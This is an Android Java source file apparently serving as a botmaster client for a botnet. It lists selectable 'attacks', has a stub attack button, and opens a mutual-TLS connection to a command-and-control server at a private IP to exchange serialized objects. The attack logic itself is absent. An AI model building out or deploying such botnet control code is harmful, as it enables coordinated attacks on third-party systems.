package botnet.botmasterandroidclient;

import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.Spinner;

import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.Certificate;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;
import javax.security.cert.X509Certificate;

public class MainActivity extends AppCompatActivity implements Serializable {

    private Spinner attacks_spinner;
    private Button attack_button;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        attacks_spinner = (Spinner) findViewById(R.id.attacksSpinner);

        ArrayAdapter<CharSequence> adapter = ArrayAdapter.createFromResource(this, R.array.attacks, android.R.layout.simple_spinner_item);
        // Specify the layout to use when the list of choices appears
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        // Apply the adapter to the spinner
        attacks_spinner.setAdapter(adapter);

        attack_button = (Button) findViewById(R.id.attackButton);
        attack_button.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                String attack = attacks_spinner.getSelectedItem().toString();
                // Send attack type to server
            }

        });

        Thread thread = new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    SSLSocket socket;
                    Certificates ca = new Certificates("BotMasterAndroid", getApplicationContext());
                    KeyManagerFactory BMasterKeyManager = ca.FindPubKey();
                    TrustManagerFactory trustManager = ca.FindCaKey();

                    //use keys to create SSLSoket
                    SSLContext ssl = SSLContext.getInstance("TLS");
                    ssl.init(BMasterKeyManager.getKeyManagers(), trustManager.getTrustManagers(), SecureRandom.getInstance("SHA1PRNG"));
                    socket = (SSLSocket) ssl.getSocketFactory().createSocket("192.168.1.4", 5555);
                    Log.d("Debug:", "123");
                    System.setProperty("javax.net.debug", "ssl:record");
                    socket.startHandshake();

                    ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
                    ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                    Log.d("omg", "is working");
                    oos.writeObject("Hello Server");
                    Log.d("msg from server: ", ois.readObject().toString());
                    ChatWithCC bot = new ChatWithCC(oos, ois);
                    bot.StartChating();
                } catch (NoSuchAlgorithmException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (KeyManagementException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (UnknownHostException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (IOException ex) {
                    Logger.getLogger(MainActivity.class.getName()).log(Level.SEVERE, null, ex);
                } catch (ClassNotFoundException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();


    }
}